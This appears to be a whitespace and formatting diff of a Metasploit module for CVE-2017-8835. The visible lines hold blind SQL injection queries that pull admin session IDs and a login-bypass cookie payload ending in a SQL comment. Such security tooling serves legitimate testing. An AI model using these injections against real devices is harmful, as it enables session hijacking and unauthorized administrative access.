@@ -15,19 +15,17 @@ class MetasploitModule < Msf::Auxiliary
           By default, a session expires 4 hours after login (the setting can be changed by the admin), for this
           reason, the module attempts to retrieve the most recently created sessions.
         },
-        'Author' =>
-          [
-            'X41 D-Sec GmbH <info@x41-dsec.de>', # Original Advisory
-            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
-          ],
+        'Author' => [
+          'X41 D-Sec GmbH <info@x41-dsec.de>', # Original Advisory
+          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
+        ],
         'License' => MSF_LICENSE,
         'Platform' => %w[linux],
-        'References' =>
-          [
-            [ 'EDB', '42130' ],
-            [ 'CVE', '2017-8835' ],
-            [ 'URL', 'https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a' ]
-          ],
+        'References' => [
+          [ 'EDB', '42130' ],
+          [ 'CVE', '2017-8835' ],
+          [ 'URL', 'https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a' ]
+        ],
         'Targets' => [['Wildcard Target', {}]],
         'DefaultTarget' => 0
       )
@@ -58,8 +56,8 @@ class MetasploitModule < Msf::Auxiliary
 
     session_ids = session_count.times.map do |i|
       id = @sqli.run_sql('select id from sessionsvariables ' \
-                    "where name='expire' order by " \
-                    "cast(value as int) desc limit 1 offset #{i}", output_charset: digit_range).to_i
+                         "where name='expire' order by " \
+                         "cast(value as int) desc limit 1 offset #{i}", output_charset: digit_range).to_i
       # if AdminOnly, check if is an admin
       if datastore['AdminOnly']
         is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
@@ -217,7 +215,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['BypassLogin']
       cookies = [
         "' or id IN (select s.id from sessions as s " \
-              "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"
+        "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"
       ]
     else
       cookies = perform_sqli
